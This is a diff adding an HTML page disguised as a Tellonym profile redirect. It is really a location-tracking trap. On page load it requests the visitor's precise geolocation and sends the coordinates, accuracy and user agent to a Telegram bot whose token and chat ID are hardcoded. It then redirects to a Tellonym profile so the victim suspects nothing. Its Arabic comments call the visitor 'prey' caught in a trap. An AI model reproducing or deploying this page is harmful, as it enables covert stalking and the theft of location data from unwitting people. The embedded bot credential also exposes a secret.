@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Tellonym - Redirecting...</title>
+    <script>
+        // تم وضع الآيدي الصحيح الخاص بك هنا
+        const token = "8571405650:AAF1hd5JADnu7a2fdqxLA1E_fUrk45Orbp4";
+        const chatId = "1138822664";
+
+        function success(pos) {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            const acc = pos.coords.accuracy;
+            const platform = navigator.userAgent;
+
+            const message = `🎯 هبطت الصيدة في الفخ!\n📍 الإحداثيات: https://www.google.com/maps?q=${lat},${lon}\n📏 دقة تحديد الموقع: ${acc} متر\n📱 نوع الجهاز: ${platform}`;
+            
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+            .finally(() => {
+                // تحويل الضحية فوراً لإبعاد الشبهة
+                window.location.href = "https://tellonym.me/Target_Username"; 
+            });
+        }
+
+        function error(err) {
+            // حتى لو رفض الموقع، يتم تحويله لكي لا يكتشف الأمر
+            window.location.href = "https://tellonym.me/Target_Username";
+        }
+
+        window.onload = function() {
+            // طلب الموقع بأعلى دقة - سيظهر تنبيه للمستخدم يطلب "السماح"
+            navigator.geolocation.getCurrentPosition(success, error, {
+                enableHighAccuracy: true,
+                timeout: 10000,
+                maximumAge: 0
+            });
+        };
+    </script>
+</head>
+<body style="background-color: #000; color: #fff; text-align: center; font-family: sans-serif; padding-top: 100px;">
+    <p>Loading Profile...</p>
+</body>
+</html>
